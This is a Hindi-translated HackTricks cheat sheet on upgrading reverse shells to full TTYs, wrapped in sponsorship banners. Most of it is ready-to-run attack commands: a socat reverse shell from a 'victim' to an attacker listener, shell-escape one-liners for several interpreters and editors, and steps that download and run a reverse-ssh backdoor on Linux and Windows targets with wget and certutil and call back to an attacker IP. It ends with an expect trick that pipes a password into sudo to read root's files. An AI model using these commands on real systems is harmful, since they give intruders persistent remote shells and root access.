# पूर्ण TTYs

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

## पूर्ण TTY

ध्यान दें कि जिस शैल आप `SHELL` चर में सेट करते हैं, वह **अवश्य** _**/etc/shells**_ के अंदर **सूचीबद्ध होनी चाहिए** या `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`। इसके अलावा, ध्यान दें कि अगले स्निपेट्स केवल बैश में काम करेंगे। यदि आप zsh में हैं, तो `bash` चलाकर शैल अर्जित करने से पहले बैश में बदलें।

#### Python

{% code overflow="wrap" %}
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
{% endcode %}

{% hint style="info" %}
आप **`stty -a`** को निष्पादित करके **पंक्तियों** और **स्तंभों** की **संख्या** प्राप्त कर सकते हैं।
{% endhint %}

#### स्क्रिप्ट

{% code overflow="wrap" %}
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
{% endcode %}

#### सोकैट
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **शैल्स उत्पन्न करें**

* `python -c 'import pty; pty.spawn("/bin/sh")'`
* `echo os.system('/bin/bash')`
* `/bin/sh -i`
* `script -qc /bin/bash /dev/null`
* `perl -e 'exec "/bin/sh";'`
* perl: `exec "/bin/sh";`
* ruby: `exec "/bin/sh"`
* lua: `os.execute('/bin/sh')`
* IRB: `exec "/bin/sh"`
* vi: `:!bash`
* vi: `:set shell=/bin/bash:shell`
* nmap: `!sh`

## **रिवर्स एसएसएच**

**इंटरैक्टिव शैल एक्सेस**, साथ ही **फ़ाइल ट्रांसफ़र** और **पोर्ट फ़ॉरवर्डिंग** के लिए एक सुविधाजनक तरीका है, लक्षित को ड्रॉप करना स्थिर लिंक्ड एसएसएच सर्वर [रिवर्स एसएसएच](https://github.com/Fahrj/reverse-ssh) टारगेट पर।

नीचे एक उदाहरण है `x86` के लिए उपक्षिप्त बाइनरी के साथ। अन्य बाइनरी के लिए, देखें [रिलीज पेज](https://github.com/Fahrj/reverse-ssh/releases/latest/)।

1. एसएसएच पोर्ट फॉरवर्डिंग अनुरोध पकड़ने के लिए स्थानीय रूप से तैयारी करें:

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
{% endcode %}

* (2a) लिनक्स लक्ष्य:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
{% endcode %}

* (2b) Windows 10 लक्ष्य (पूर्व संस्करणों के लिए, [परियोजना readme](https://github.com/Fahrj/reverse-ssh#features) देखें): 

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
{% endcode %}

* यदि ReverseSSH पोर्ट फॉरवर्डिंग अनुरोध सफल रहा है, तो अब आपको `reverse-ssh(.exe)` चलाने वाले उपयोगकर्ता के संदर्भ में डिफ़ॉल्ट पासवर्ड `letmeinbrudipls` के साथ लॉग इन करने में सक्षम होना चाहिए:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## कोई TTY नहीं

यदि किसी कारणवश आपको एक पूर्ण TTY प्राप्त नहीं हो सकता है, तो भी आप **प्रोग्रामों के साथ बातचीत कर सकते हैं** जो उपयोगकर्ता इनपुट की अपेक्षा करते हैं। निम्नलिखित उदाहरण में, पासवर्ड `sudo` को पास किया जाता है ताकि एक फ़ाइल पढ़ सके:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

दूसरे तरीके HackTricks का समर्थन करने के लिए:

* अगर आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की हमारी विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह की खोज करें
* **शामिल हों** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें, HackTricks** के लिए PRs सबमिट करके और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>
